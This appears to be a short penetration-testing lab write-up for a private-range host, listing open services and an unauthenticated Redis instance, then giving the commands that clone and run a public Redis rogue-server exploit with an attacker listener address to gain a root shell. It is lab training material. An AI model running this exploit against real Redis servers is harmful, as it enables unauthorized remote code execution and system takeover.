
## System Info
- **IP:** 192.168.119.69  
- **OS/Tech:**  

---

##  Credentials
- **User:** _(none found)_  
- **Password:** _(none)_  

---

## Service Enumeration
| Port     | State | Service      | Version                             |
| -------- | ----- | ------------ | ----------------------------------- |
| **22**   | open  | ssh          | OpenSSH 7.4p1 Debian 10+deb9u7       |
| **80**   | open  | http         | nginx 1.10.3                        |
| **6379** | open  | redis        | Redis key-value store 5.0.9         |
| **8080** | open  | http-proxy   | NodeBB (version unknown)            |

---

## Initial Observations
- **HTTP (80):** default nginx landing page; no source leaks.  
- **Redis (6379):** no `requirepass`; can connect via `redis-cli`; `GET` without key returns usage error.  
- **HTTP‑Proxy (8080):** NodeBB forum; version not disclosed.  
- **SSH (22):** no valid credentials.

---

## Exploitation: Redis Rogue‑Server RCE
1. **Clone exploit repo**  
   ```bash
   git clone https://github.com/n0b0dyCN/redis-rogue-server.git
   cd redis-rogue-server
   ./redis-rogue-server.py \
  --rhost 192.168.119.69 \
  --rport 6379 \
  --lhost 192.168.45.183
  ```
ROOT !!!!





